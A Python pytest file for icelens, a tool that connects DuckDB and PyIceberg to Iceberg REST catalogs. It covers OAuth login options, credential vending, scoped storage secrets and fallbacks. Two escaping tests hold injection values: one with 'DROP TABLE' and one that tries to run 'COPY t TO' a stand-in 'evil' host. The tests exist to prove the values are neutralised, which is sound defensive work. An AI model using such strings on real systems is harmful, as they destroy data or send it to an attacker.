"""The routes to a catalog's rows, without a catalog server: how icelens logs DuckDB in, when it
stops asking for vended credentials, which storage credentials it hands DuckDB, and what it does
when DuckDB cannot read a table at all.

`test_polaris.py` checks the same things against a real Polaris and skips without one. These
run everywhere, so the rules are pinned even on a machine with nothing running - and the
warehouse probe is checked against a server on localhost that speaks just enough of Polaris.
"""

from __future__ import annotations

import json
import threading
import urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

import duckdb
import pyarrow as pa
import pytest

from icelens import catalog
from icelens.catalog import (
    IcelensError,
    Lake,
    Target,
    asks_for_vended_credentials,
    discover,
    is_nested,
    probe_warehouses,
    qualified,
    refused_to_vend,
    remember_secrets,
    rest_login,
    scrub,
    without_vended_credentials,
)

POLARIS_REFUSAL = (
    "BadRequestError: IllegalArgumentException: Credential vending was requested for table core.t, "
    "but no credentials are available"
)


# -- logging DuckDB in the way PyIceberg logs in ----------------------------------------


def test_a_token_is_passed_as_a_token() -> None:
    assert rest_login({"token": "abc123"}) == ["TOKEN 'abc123'"]
    assert rest_login({"header.Authorization": "Bearer xyz789"}) == ["TOKEN 'xyz789'"]


def test_client_credentials_win_over_a_token_as_they_do_in_pyiceberg() -> None:
    """Measured on PyIceberg 0.12: with both set it exchanges the credential and never sends the
    token. DuckDB was handed the token - one PyIceberg had not used, often a stale one - got a
    401, and the rows fell back to PyIceberg without a word about why."""
    assert rest_login({"token": "abc123", "credential": "id:secret"})[:2] == ["CLIENT_ID 'id'", "CLIENT_SECRET 'secret'"]
    assert rest_login({"token": "abc123"}) == ["TOKEN 'abc123'"]


class _Listening:
    """A REST catalog that writes down how it was asked: the path and the two headers that matter.

    It answers the token exchange with `FRESH-from-credential`, so a request carrying that token
    was logged in with the credential and one carrying anything else was not.
    """

    def __init__(self) -> None:
        self.seen: list[tuple[str, str, str | None, str | None]] = []
        seen = self.seen

        class Handler(BaseHTTPRequestHandler):
            def _answer(self, body: dict) -> None:
                raw = json.dumps(body).encode()
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(raw)))
                self.end_headers()
                self.wfile.write(raw)

            def do_GET(self) -> None:  # noqa: N802 - http.server's spelling
                seen.append(("GET", self.path, self.headers.get("Authorization"), self.headers.get("X-Iceberg-Access-Delegation")))
                if self.path.startswith("/v1/config"):
                    return self._answer({"defaults": {}, "overrides": {}})
                if self.path.startswith("/management/v1/warehouse"):
                    return self._answer({"warehouses": [{"name": "wh"}]})
                return self._answer({"namespaces": []})

            def do_POST(self) -> None:  # noqa: N802
                self.rfile.read(int(self.headers.get("Content-Length") or 0))
                seen.append(("POST", self.path, None, None))
                self._answer({"access_token": "FRESH-from-credential", "token_type": "bearer", "expires_in": 3600,
                              "issued_token_type": "urn:ietf:params:oauth:token-type:access_token"})

            def log_message(self, *args: object) -> None:
                pass

        self.server = HTTPServer(("127.0.0.1", 0), Handler)
        self.uri = f"http://127.0.0.1:{self.server.server_port}"
        threading.Thread(target=self.server.serve_forever, daemon=True).start()

    def bearers(self) -> set[str | None]:
        return {auth for method, _, auth, _ in self.seen if method == "GET"}


@pytest.fixture()
def listening() -> _Listening:
    server = _Listening()
    yield server
    server.server.shutdown()
    server.server.server_close()


def test_both_halves_log_in_with_the_credential_when_a_token_is_set_too(listening: _Listening) -> None:
    """The reviewer's measurement, kept: PyIceberg exchanges the credential and never sends the
    token; DuckDB and the warehouse probe now do the same rather than use a token it ignored."""
    target = discover(uri=listening.uri, properties={"token": "STALE-token", "credential": "cid:csecret"}, search_dotenv=False)
    lake = Lake(target)
    lake.catalog.list_namespaces()
    assert listening.bearers() == {"Bearer FRESH-from-credential"}
    assert [option.split(" ", 1)[0] for option in rest_login(target.properties)] == ["CLIENT_ID", "CLIENT_SECRET", "OAUTH2_SERVER_URI", "OAUTH2_SCOPE"]
    listening.seen.clear()
    assert probe_warehouses(listening.uri, properties=target.properties, timeout=2.0) == ["wh"]
    assert listening.bearers() == {"Bearer FRESH-from-credential"}


def test_an_authorization_header_reaches_pyiceberg_as_the_token_duckdb_is_given(listening: _Listening) -> None:
    """PyIceberg replaces a configured Authorization header with its own - `Bearer None`, with no
    token - while DuckDB was handed the header's token: the two halves logged in differently."""
    target = discover(uri=listening.uri, properties={"header.authorization": "Bearer HDR-token-1"}, search_dotenv=False)
    Lake(target).catalog.list_namespaces()
    assert listening.bearers() == {"Bearer HDR-token-1"}
    assert rest_login(target.properties) == ["TOKEN 'HDR-token-1'"]
    # only a bearer token is one: anything else stays a header, and is not passed off as a token
    assert "token" not in discover(uri=listening.uri, properties={"header.Authorization": "Basic dXNlcg=="}, search_dotenv=False).properties


def test_a_header_the_user_set_is_theirs_however_they_cased_it(listening: _Listening) -> None:
    """PyIceberg's headers are case-insensitive. Adding the canonical spelling beside a lowercase
    `header.x-iceberg-access-delegation: ""` sent `vended-credentials` after all, since the later
    of the two won - to a catalog the user had just told not to vend."""
    target = discover(uri=listening.uri, properties={"header.x-iceberg-access-delegation": ""}, search_dotenv=False)
    assert [key for key in target.properties if key.lower() == catalog._DELEGATION.lower()] == ["header.x-iceberg-access-delegation"]
    assert not asks_for_vended_credentials(target.properties)
    assert "ACCESS_DELEGATION_MODE 'none'" in (Lake(target)._attach_sql() or "")
    Lake(target).catalog.list_namespaces()
    assert {delegation for *_, delegation in listening.seen} == {""}
    vending = Target({"uri": listening.uri, "header.X-ICEBERG-ACCESS-DELEGATION": "vended-credentials"})
    assert asks_for_vended_credentials(vending.properties)
    stopped = without_vended_credentials(vending)
    assert {k: v for k, v in stopped.properties.items() if k.startswith("header.")} == {catalog._DELEGATION: ""}


def test_client_credentials_become_duckdbs_oauth_options() -> None:
    options = rest_login({"uri": "https://polaris.example/api/catalog/", "credential": "root:s3cr3t", "scope": "PRINCIPAL_ROLE:ALL"})
    assert options == [
        "CLIENT_ID 'root'",
        "CLIENT_SECRET 's3cr3t'",
        "OAUTH2_SERVER_URI 'https://polaris.example/api/catalog/v1/oauth/tokens'",
        "OAUTH2_SCOPE 'PRINCIPAL_ROLE:ALL'",
    ]


def test_the_scope_and_token_url_are_always_spelled_out() -> None:
    """The two clients default them differently; leaving either to DuckDB logs it in as someone else."""
    options = rest_login({"uri": "https://x.example/c", "credential": "a:b"})
    assert "OAUTH2_SCOPE 'catalog'" in options  # PyIceberg's default, not DuckDB's PRINCIPAL_ROLE:ALL
    databricks = rest_login(
        {
            "uri": "https://ws.example/api/2.1/unity-catalog/iceberg-rest",
            "credential": "sp-id:sp-secret",
            "oauth2-server-uri": "https://ws.example/oidc/v1/token",
            "scope": "all-apis",
        }
    )
    assert "OAUTH2_SERVER_URI 'https://ws.example/oidc/v1/token'" in databricks
    assert "OAUTH2_SCOPE 'all-apis'" in databricks


def test_a_bare_secret_has_no_client_id() -> None:
    """Snowflake Horizon takes a PAT as the secret and refuses a client id."""
    options = rest_login({"uri": "https://acct.example/polaris/api/catalog", "credential": "pat-value", "scope": "session:role:R"})
    assert options[:2] == ["CLIENT_ID ''", "CLIENT_SECRET 'pat-value'"]


def test_no_login_is_said_out_loud() -> None:
    assert rest_login({"uri": "http://x.example/c"}) == ["AUTHORIZATION_TYPE 'none'"]


def test_login_values_are_escaped() -> None:
    options = rest_login({"uri": "http://x.example/c", "credential": "id:it's'; DROP TABLE x; --"})
    assert "CLIENT_SECRET 'it''s''; DROP TABLE x; --'" in options


def test_the_attach_carries_the_login_and_stays_one_statement() -> None:
    lake = Lake(Target({"type": "rest", "uri": "http://x.example/c", "warehouse": "w", "credential": "id:secret-value"}), read_only=True)
    sql = lake._attach_sql() or ""
    assert "CLIENT_ID 'id'" in sql and "CLIENT_SECRET 'secret-value'" in sql
    assert "READ_ONLY" in sql and "ACCESS_DELEGATION_MODE" not in sql
    assert duckdb.extract_statements(sql)[0].type.name == "ATTACH"
    assert len(duckdb.extract_statements(sql)) == 1


def test_the_secret_half_of_a_credential_is_scrubbed_on_its_own() -> None:
    """DuckDB is handed the halves separately, so an error quoting CLIENT_SECRET must not print it."""
    remember_secrets({"credential": "client-7731:half-secret-5512"})
    assert scrub("CLIENT_SECRET 'half-secret-5512' was refused") == "CLIENT_SECRET '********' was refused"


def test_a_property_that_is_not_text_is_not_a_secret_and_not_a_crash() -> None:
    """PyIceberg keeps its auth manager among a FileIO's properties."""
    before = set(catalog._secrets)
    remember_secrets({"credential": object(), "token": None, "s3.secret-access-key": 12345678})  # type: ignore[dict-item]
    assert catalog._secrets == before
    assert scrub("key 12345678 None") == "key 12345678 None"


# -- asking, and not asking, for vended credentials -------------------------------------


@pytest.mark.parametrize(
    ("header", "asks"),
    [(None, True), ("vended-credentials", True), ("", False), ("remote-signing", False)],
)
def test_whether_a_connection_asks_for_vended_credentials(header: str | None, asks: bool) -> None:
    props = {} if header is None else {"header.X-Iceberg-Access-Delegation": header}
    assert asks_for_vended_credentials(props) is asks


def test_not_asking_reaches_duckdb_as_well() -> None:
    target = without_vended_credentials(Target({"type": "rest", "uri": "http://x.example/c", "warehouse": "w"}))
    assert target.properties["header.X-Iceberg-Access-Delegation"] == ""
    assert "ACCESS_DELEGATION_MODE 'none'" in (Lake(target)._attach_sql() or "")


def test_a_refusal_to_vend_is_recognised_in_both_clients_words() -> None:
    assert refused_to_vend(RuntimeError(POLARIS_REFUSAL))
    assert refused_to_vend(RuntimeError('GetTableInformation endpoint returned BadRequest_400 with message "Credential vending was requested'))
    assert not refused_to_vend(RuntimeError("403 Forbidden"))


class _Refuses:
    """A catalog that refuses vending once per connection, as Polaris without STS does."""

    def __init__(self, table: object) -> None:
        self.table = table
        self.asked: list[str] = []

    def load_table(self, ident: str) -> object:
        self.asked.append(ident)
        if len(self.asked) == 1:
            raise RuntimeError(POLARIS_REFUSAL)
        return self.table


def test_a_catalog_that_refuses_to_vend_is_asked_once_more_without(monkeypatch: pytest.MonkeyPatch) -> None:
    stub = _Refuses(table="the table")
    monkeypatch.setattr(Lake, "catalog", property(lambda self: stub))
    lake = Lake(Target({"type": "rest", "uri": "http://x.example/c", "warehouse": "w"}))
    assert lake.table("core.t") == "the table"
    assert stub.asked == ["core.t", "core.t"]
    assert not asks_for_vended_credentials(lake.target.properties)
    assert "vends no credentials" in lake.delegation_note


def test_a_second_refusal_is_an_error_not_a_loop(monkeypatch: pytest.MonkeyPatch) -> None:
    class Always:
        def load_table(self, ident: str) -> object:
            raise RuntimeError(POLARIS_REFUSAL)

    monkeypatch.setattr(Lake, "catalog", property(lambda self: Always()))
    lake = Lake(Target({"type": "rest", "uri": "http://x.example/c", "warehouse": "w"}))
    with pytest.raises(IcelensError, match="cannot load core.t"):
        lake.table("core.t")


def test_a_connection_that_never_asked_is_not_retried(monkeypatch: pytest.MonkeyPatch) -> None:
    stub = _Refuses(table="the table")
    monkeypatch.setattr(Lake, "catalog", property(lambda self: stub))
    lake = Lake(without_vended_credentials(Target({"type": "rest", "uri": "http://x.example/c", "warehouse": "w"})))
    with pytest.raises(IcelensError):
        lake.table("core.t")
    assert stub.asked == ["core.t"]


@pytest.fixture()
def unvending(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Target:
    """icelens's own REST catalog, answering a table load that asks for vended credentials the
    way Polaris over a store with no STS does: a 400, in Polaris's words. Asked without, it
    answers as usual. A connection to it asks, as every REST connection does by default."""
    from icelens import rest
    from icelens.catalog import sandbox_target

    Lake(sandbox_target("unvending", root=tmp_path, version=3)).write("CREATE TABLE core.t AS SELECT range AS id FROM range(3)")
    running = rest.serve(tmp_path / "unvending")
    route = rest._Handler._route

    def refusing(self, method, parts, query):  # type: ignore[no-untyped-def]
        asked = "vended-credentials" in (self.headers.get("X-Iceberg-Access-Delegation") or "")
        if method == "GET" and len(parts) >= 2 and parts[-2] == "tables" and asked:
            raise rest.RestError(
                400, "IllegalArgumentException",
                f"Credential vending was requested for table {parts[-3]}.{parts[-1]}, but no credentials are available",
            )
        return route(self, method, parts, query)

    monkeypatch.setattr(rest._Handler, "_route", refusing)
    return discover(uri=running.uri, warehouse=rest.PREFIX, properties={"token": running.token}, search_dotenv=False)


@pytest.mark.duckdb_extensions
@pytest.mark.parametrize("first", ["rows", "query"])
def test_duckdb_stops_asking_a_catalog_that_will_not_vend(unvending: Target, first: str) -> None:
    """The refusal reaches DuckDB too - the SQL pane and an attached read never pass through
    `Lake.table` - and is answered the same way: reattach without asking, and read the rows."""
    assert asks_for_vended_credentials(unvending.properties)
    lake = Lake(unvending, read_only=True)
    try:
        if first == "rows":
            rows, engine = lake.rows("core.t")
            assert (rows.num_rows, engine) == (3, "duckdb")
        assert lake.query('SELECT count(*) AS n FROM icelens."core"."t"').to_pylist() == [{"n": 3}]
        assert lake.mode == "attach"
        assert "vends no credentials" in lake.delegation_note
        assert not asks_for_vended_credentials(lake.target.properties)
    finally:
        lake.close()


@pytest.mark.duckdb_extensions
def test_a_database_duckdb_has_given_up_on_is_dropped_and_reopened(tmp_path: Path) -> None:
    """After an internal error DuckDB invalidates the database, and every later statement on it
    failed with "database has been invalidated" until icelens was restarted."""
    from icelens.catalog import sandbox_target

    lake = Lake(sandbox_target("fatal", root=tmp_path), read_only=True)
    try:
        assert lake.engine == "duckdb"

        class Invalidated:
            def __init__(self, con: object) -> None:
                self.con = con

            def execute(self, sql: str, *args: object) -> object:
                raise duckdb.InternalException(
                    "INTERNAL Error: IcebergDelete multi_file_list is NULL\n\nStack Trace:\n\n/x/iceberg.duckdb_extension(+0xf3290b)"
                )

            def close(self) -> None:
                self.con.close()  # type: ignore[attr-defined]

        lake._con = Invalidated(lake._con)
        with pytest.raises(IcelensError) as failed:
            lake.query("SELECT 1")
        message = str(failed.value)
        assert message.startswith("INTERNAL Error: IcebergDelete multi_file_list is NULL")
        assert "Stack Trace" not in message and "the next request opens a fresh one" in message
        assert lake.query("SELECT 42 AS n").to_pylist() == [{"n": 42}]
    finally:
        lake.close()


# -- the environment -------------------------------------------------------------------


def test_icelens_variables_are_matched_whole(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    """`ICELENS_TEST_CATALOG_URI` - the live tests' setting - used to become every test's catalog."""
    monkeypatch.chdir(tmp_path)
    for key in [k for k in list(__import__("os").environ) if k.startswith("ICELENS_")]:
        monkeypatch.delenv(key)
    monkeypatch.setenv("ICELENS_TEST_CATALOG_URI", "http://not-mine.example/catalog")
    monkeypatch.setenv("ICELENS_TEST_POLARIS_S3_ENDPOINT", "http://not-mine.example:9000")
    assert "uri" not in discover(search_dotenv=False).properties
    monkeypatch.setenv("ICELENS_CATALOG_URI", "http://mine.example/catalog")
    monkeypatch.setenv("ICELENS_S3_ENDPOINT", "http://mine.example:9000")
    props = discover(search_dotenv=False).properties
    assert (props["uri"], props["s3.endpoint"]) == ("http://mine.example/catalog", "http://mine.example:9000")


def test_a_dotenv_is_still_matched_on_the_suffix(tmp_path: Path) -> None:
    env = tmp_path / ".env"
    env.write_text("ACME_CATALOG_URI=http://acme.example/catalog\n")
    env.chmod(0o600)
    assert discover(env_file=env).properties["uri"] == "http://acme.example/catalog"


# -- nested namespaces -----------------------------------------------------------------


def test_a_nested_namespace_is_one_schema_to_duckdb() -> None:
    assert qualified("core.nested.deep") == 'icelens."core.nested"."deep"'
    assert qualified("a.b.c.t") == 'icelens."a.b.c"."t"'
    assert is_nested("core.nested.deep") and not is_nested("core.items")
    statement = duckdb.extract_statements(f"SELECT * FROM {qualified('core.nested.deep')}")
    assert len(statement) == 1


def test_nesting_is_asked_of_duckdb_only_where_it_was_seen() -> None:
    lake = Lake(Target({"type": "rest", "uri": "http://x.example/c", "warehouse": "w"}))
    assert not lake._known_to_nest()
    lake._namespace_cache = ["core", "raw"]
    assert not lake._known_to_nest()
    lake._namespace_cache = ["core", "core.nested"]
    assert lake._known_to_nest()
    lake._nested = True
    assert "SUPPORT_NESTED_NAMESPACES true" in (lake._attach_sql() or "")


# -- storage credentials for one table --------------------------------------------------


def test_a_tables_secret_is_scoped_to_its_own_directories() -> None:
    from icelens.catalog import _table_scopes

    assert _table_scopes("s3://b/wh/core/items", "s3://b/wh/core/items/metadata/00002-x.metadata.json") == ["s3://b/wh/core/items/"]
    # never `…/core/items`, which would also match `…/core/items2`
    assert _table_scopes("s3://b/wh/core/items/", "s3://b/wh/core/items/metadata/v1.gz.metadata.json") == ["s3://b/wh/core/items/"]
    # metadata kept beside the table root, not under it: both directories, and not their parent
    assert _table_scopes("s3://b/t", "s3://b/t__metadata/v1.metadata.json") == ["s3://b/t/", "s3://b/t__metadata/"]


@pytest.mark.parametrize(
    ("location", "metadata"),
    [
        ("s3://lake/sales/t", "s3://elsewhere/m.json"),  # metadata at a bucket's root: `s3://` was the scope
        ("s3://lake", "s3://lake/metadata/v1.metadata.json"),  # a table that is a whole bucket
        ("file:///tmp/t", "file:///tmp/t/metadata/v1.metadata.json"),  # no bucket at all
    ],
)
def test_a_scope_wider_than_one_directory_in_a_bucket_is_refused(location: str, metadata: str) -> None:
    from icelens.catalog import _table_scopes

    assert _table_scopes(location, metadata) is None


class _VendingIo:
    def __init__(self, name: str) -> None:
        self.properties = {"s3.access-key-id": f"AKIA-{name}", "s3.secret-access-key": f"{name}-secret", "s3.session-token": f"tok-{name}"}


class _VendedTable:
    """A table as a vending catalog returns it, laid out the way the reviewer's repro was."""

    def __init__(self, name: str, metadata: str | None = None) -> None:
        self.io = _VendingIo(name)
        self.name = name
        self.metadata_location = metadata or f"s3://b/{name}__metadata/v1.metadata.json"

    def location(self) -> str:
        return f"s3://b/{self.name}"


@pytest.mark.duckdb_extensions
def test_two_tables_never_share_a_secret_or_read_with_each_others_keys(tmp_path: Path) -> None:
    """Scoped to the common prefix, `orders` and `payroll` got one secret, scoped to the bucket,
    named after that prefix: the second handover replaced the first, and `orders` was read
    with payroll's keys - as was every other path in the bucket."""
    lake = Lake(Target({"type": "sql", "uri": f"sqlite:///{tmp_path / 'c.db'}", "warehouse": tmp_path.as_uri()}))
    con = duckdb.connect()
    con.execute("LOAD httpfs")
    lake._con = con
    try:
        lake._hand_over_credentials("demo.orders", _VendedTable("orders"))
        lake._hand_over_credentials("demo.payroll", _VendedTable("payroll"))
        lake._hand_over_credentials("demo.wide", _VendedTable("wide", "s3://elsewhere/v1.metadata.json"))
        assert len(con.execute("SELECT name FROM duckdb_secrets()").fetchall()) == 2

        def key_for(path: str) -> str | None:
            found = con.execute(f"SELECT name FROM which_secret('{path}', 's3')").fetchone()
            if found is None:
                return None
            # redacted, the key id still shows - and the key id says whose keys these are
            (described,) = con.execute(f"SELECT secret_string FROM duckdb_secrets() WHERE name = '{found[0]}'").fetchone()
            return described.split("key_id=AKIA-", 1)[1].split(";", 1)[0]

        assert key_for("s3://b/orders/data/f.parquet") == "orders"
        assert key_for("s3://b/orders__metadata/v1.metadata.json") == "orders"
        assert key_for("s3://b/payroll/data/f.parquet") == "payroll"
        assert key_for("s3://b/anything_else/x.parquet") is None
        assert key_for("s3://b/wide/data/f.parquet") is None, "a table whose scope would be a whole store gets no secret"
    finally:
        lake._con = None
        con.close()


def test_vended_s3_keys_become_a_scoped_secret() -> None:
    from icelens.catalog import _s3_secret

    sql = _s3_secret(
        {
            "s3.access-key-id": "AKIA-vended",
            "s3.secret-access-key": "vended-secret",
            "s3.session-token": "session-tok",
            "s3.endpoint": "http://127.0.0.1:9000",
            "client.region": "us-east-1",
        },
        "icelens_t_abc_s3",
        "s3://b/wh/core/items/",
    ) or ""
    for part in ("SESSION_TOKEN 'session-tok'", "REGION 'us-east-1'", "USE_SSL false", "SCOPE 's3://b/wh/core/items/'"):
        assert part in sql
    assert sql.startswith('CREATE OR REPLACE SECRET "icelens_t_abc_s3" (')
    assert len(duckdb.extract_statements(sql)) == 1


def test_a_scope_cannot_break_out_of_its_literal() -> None:
    from icelens.catalog import _gcs_secret

    sql = _gcs_secret({"gcs.oauth2.token": "ya29.t"}, "icelens_t_x_gcs", "gs://b/x'); COPY t TO 'http://evil/") or ""
    assert len(duckdb.extract_statements(sql)) == 1
    assert "SCOPE 'gs://b/x''); COPY t TO ''http://evil/'" in sql


def test_a_table_with_no_keys_of_its_own_gets_no_secret(tmp_path: Path) -> None:
    lake = Lake(Target({"type": "sql", "uri": f"sqlite:///{tmp_path / 'c.db'}", "warehouse": tmp_path.as_uri()}))
    made: list[str] = []

    class Con:
        def execute(self, sql: str) -> None:
            made.append(sql)

    class Io:
        properties = {"s3.access-key-id": "configured", "py-io-impl": object()}

    class Table:
        io = Io()

        def location(self) -> str:
            return "s3://b/t"

        metadata_location = "s3://b/t/metadata/v1.metadata.json"

    lake._con = Con()
    lake.target = Target({**lake.target.properties, "s3.access-key-id": "configured"})
    lake._hand_over_credentials("demo.t", Table())
    assert made == []
    Io.properties = {"s3.access-key-id": "vended", "s3.secret-access-key": "vended-secret", "s3.session-token": "tok"}
    lake._hand_over_credentials("demo.t", Table())
    assert len(made) == 1 and "SCOPE 's3://b/t/'" in made[0]
    assert "vended-secret" not in scrub(made[0])


# -- when DuckDB cannot read a table ---------------------------------------------------


@pytest.fixture()
def small_lake(tmp_path: Path) -> Lake:
    lake = Lake(Target({"type": "sql", "uri": f"sqlite:///{tmp_path / 'c.db'}", "warehouse": tmp_path.as_uri()}))
    lake.catalog.create_namespace("demo")
    for name in ("one", "two"):
        table = lake.catalog.create_table(f"demo.{name}", schema=pa.schema([("x", pa.int64())]))
        table.append(pa.table({"x": [1, 2, 3]}))
    yield lake
    lake.close()


def _raising(kind: type[Exception], text: str):
    def fail(*args: object, **kwargs: object) -> None:
        try:
            raise kind(text)
        except kind as exc:
            raise IcelensError(text) from exc

    return fail


@pytest.mark.duckdb_extensions
def test_pyiceberg_reads_what_duckdb_could_not_reach(small_lake: Lake, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(small_lake, "_duck_rows", _raising(duckdb.HTTPException, "HTTP Error: HTTP GET error (HTTP 403 Forbidden)"))
    rows, engine = small_lake.rows("demo.one")
    assert rows.num_rows == 3
    assert engine == "pyiceberg (duckdb could not read it: HTTP Error: HTTP GET error (HTTP 403 Forbidden))"


@pytest.mark.duckdb_extensions
def test_a_question_duckdb_rejects_is_not_handed_to_pyiceberg(small_lake: Lake, monkeypatch: pytest.MonkeyPatch) -> None:
    """A binder error is about the SQL somebody typed; PyIceberg would only answer it worse."""
    monkeypatch.setattr(small_lake, "_duck_rows", _raising(duckdb.BinderException, 'Referenced column "nope" not found'))
    with pytest.raises(IcelensError, match="nope"):
        small_lake.rows("demo.one", where="nope > 1")


@pytest.mark.duckdb_extensions
def test_when_both_routes_fail_the_storage_reason_is_the_one_shown(small_lake: Lake, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(small_lake, "_duck_rows", _raising(duckdb.IOException, "IO Error: 403 from the store"))
    monkeypatch.setattr(small_lake, "_pyiceberg_rows", _raising(OSError, "pyiceberg's own failure"))
    with pytest.raises(IcelensError, match="403 from the store"):
        small_lake.rows("demo.one")


@pytest.mark.duckdb_extensions
def test_sql_names_the_tables_it_could_not_read(small_lake: Lake) -> None:
    """It used to report a table the tree was showing as one that "does not exist"."""
    location = small_lake.table("demo.two").metadata_location
    Path(urllib.parse.urlsplit(location).path).unlink()
    small_lake.forget()
    assert small_lake.query('SELECT count(*) AS n FROM icelens."demo"."one"').to_pylist() == [{"n": 3}]
    with pytest.raises(IcelensError, match=r"1 tables could not be read for SQL: demo\.two \("):
        small_lake.query('SELECT count(*) FROM icelens."demo"."two"')


@pytest.mark.duckdb_extensions
def test_a_refused_attach_is_told_apart_from_an_impossible_one(small_lake: Lake, monkeypatch: pytest.MonkeyPatch) -> None:
    assert small_lake.mode == "bridge" and not small_lake.attach_refused  # a SQL catalog: the plan
    small_lake.close()
    monkeypatch.setattr(
        small_lake,
        "_attach_sql",
        lambda: "ATTACH 'w' AS icelens (TYPE ICEBERG, ENDPOINT 'http://127.0.0.1:1/catalog', AUTHORIZATION_TYPE 'none')",
    )
    assert small_lake.mode == "bridge" and small_lake.attach_refused  # a refusal: the symptom
    assert (small_lake.attach_error or "").startswith("attach refused")
    assert small_lake.rows("demo.one")[0].num_rows == 3


@pytest.mark.duckdb_extensions
async def test_the_status_bar_names_a_refused_attach(small_lake: Lake, monkeypatch: pytest.MonkeyPatch) -> None:
    from icelens.app import IcelensApp

    monkeypatch.setattr(
        small_lake,
        "_attach_sql",
        lambda: "ATTACH 'w' AS icelens (TYPE ICEBERG, ENDPOINT 'http://127.0.0.1:1/catalog', AUTHORIZATION_TYPE 'none')",
    )
    small_lake.delegation_note = "the catalog vends no credentials; using the configured ones"
    app = IcelensApp(small_lake, limit=5, width=30)
    async with app.run_test(size=(220, 30)) as pilot:
        await pilot.pause()
        app.status()
        status = str(app.query_one("#status").content)
        assert "attach refused" in status
        assert "vends no credentials" in status


# -- the warehouse probe ---------------------------------------------------------------


class _Fake(BaseHTTPRequestHandler):
    """Just enough of Lakekeeper, Polaris and the REST spec for `probe_warehouses`."""

    routes: dict[str, tuple[int, object]] = {}
    seen: list[tuple[str, str, str, str]] = []

    def log_message(self, *args: object) -> None:
        pass

    def _answer(self, method: str) -> None:
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length).decode() if length else ""
        self.seen.append((method, self.path, self.headers.get("Authorization") or "", body))
        status, payload = self.routes.get(f"{method} {self.path}", (404, {"error": "no"}))
        if status in (301, 302):
            self.send_response(status)
            self.send_header("Location", str(payload))
            self.end_headers()
            return
        data = json.dumps(payload).encode()
        self.send_response(status)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self) -> None:  # noqa: N802 - the stdlib's name
        self._answer("GET")

    def do_POST(self) -> None:  # noqa: N802
        self._answer("POST")


@pytest.fixture()
def fake() -> type[_Fake]:
    _Fake.routes, _Fake.seen = {}, []
    server = HTTPServer(("127.0.0.1", 0), _Fake)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    _Fake.base = f"http://127.0.0.1:{server.server_port}"  # type: ignore[attr-defined]
    yield _Fake
    server.shutdown()


def _polaris(fake: type[_Fake]) -> None:
    fake.routes["POST /api/catalog/v1/oauth/tokens"] = (200, {"access_token": "tok-from-polaris", "token_type": "bearer"})
    fake.routes["GET /api/management/v1/catalogs"] = (200, {"catalogs": [{"name": "beta"}, {"name": "alpha"}]})


def test_polaris_catalogs_are_listed_after_logging_in(fake: type[_Fake]) -> None:
    _polaris(fake)
    uri = f"{fake.base}/api/catalog"  # type: ignore[attr-defined]
    props = {"credential": "root:s3cr3t", "scope": "PRINCIPAL_ROLE:ALL"}
    assert probe_warehouses(uri, properties=props, timeout=2) == ["alpha", "beta"]
    token_call = next(call for call in fake.seen if call[0] == "POST")
    assert dict(urllib.parse.parse_qsl(token_call[3])) == {
        "grant_type": "client_credentials",
        "client_id": "root",
        "client_secret": "s3cr3t",
        "scope": "PRINCIPAL_ROLE:ALL",
    }
    listing = next(call for call in fake.seen if call[1] == "/api/management/v1/catalogs")
    assert listing[2] == "Bearer tok-from-polaris"


def test_a_bare_secret_is_sent_without_a_client_id(fake: type[_Fake]) -> None:
    _polaris(fake)
    probe_warehouses(f"{fake.base}/api/catalog", properties={"credential": "pat-only"}, timeout=2)  # type: ignore[attr-defined]
    form = dict(urllib.parse.parse_qsl(next(call for call in fake.seen if call[0] == "POST")[3]))
    assert "client_id" not in form and form["client_secret"] == "pat-only" and form["scope"] == "catalog"


def test_a_principal_that_may_not_list_gets_asked_for_a_name(fake: type[_Fake]) -> None:
    _polaris(fake)
    fake.routes["GET /api/management/v1/catalogs"] = (403, {"error": {"message": "not authorized"}})
    assert probe_warehouses(f"{fake.base}/api/catalog", properties={"credential": "a:b"}, timeout=2) == []  # type: ignore[attr-defined]


def test_the_config_endpoint_is_asked_where_it_is(fake: type[_Fake]) -> None:
    """It used to be asked at `<uri minus /catalog>/v1/config`, which is not where it lives."""
    fake.routes["GET /catalog/v1/config"] = (200, {"defaults": {"warehouse": "the-default"}})
    fake.routes["GET /v1/config"] = (200, {"defaults": {"warehouse": "the-wrong-one"}})
    assert probe_warehouses(f"{fake.base}/catalog", timeout=2) == ["the-default"]  # type: ignore[attr-defined]


def test_an_answer_of_another_shape_is_not_a_crash(fake: type[_Fake]) -> None:
    fake.routes["GET /management/v1/warehouse"] = (200, ["not", "an", "object"])
    fake.routes["GET /management/v1/catalogs"] = (200, {"catalogs": "nope"})
    fake.routes["GET /v1/config"] = (200, {"defaults": None})
    assert probe_warehouses(fake.base, timeout=2) == []  # type: ignore[attr-defined]


def test_the_token_request_follows_no_redirect(fake: type[_Fake]) -> None:
    """A secret posted to a redirect target is a secret handed to whoever the catalog names."""
    fake.routes["POST /api/catalog/v1/oauth/tokens"] = (302, f"{fake.base}/elsewhere")  # type: ignore[attr-defined]
    fake.routes["POST /elsewhere"] = (200, {"access_token": "should-never-be-fetched"})
    assert probe_warehouses(f"{fake.base}/api/catalog", properties={"credential": "a:b"}, timeout=2) == []  # type: ignore[attr-defined]
    assert not any(call[1] == "/elsewhere" for call in fake.seen)
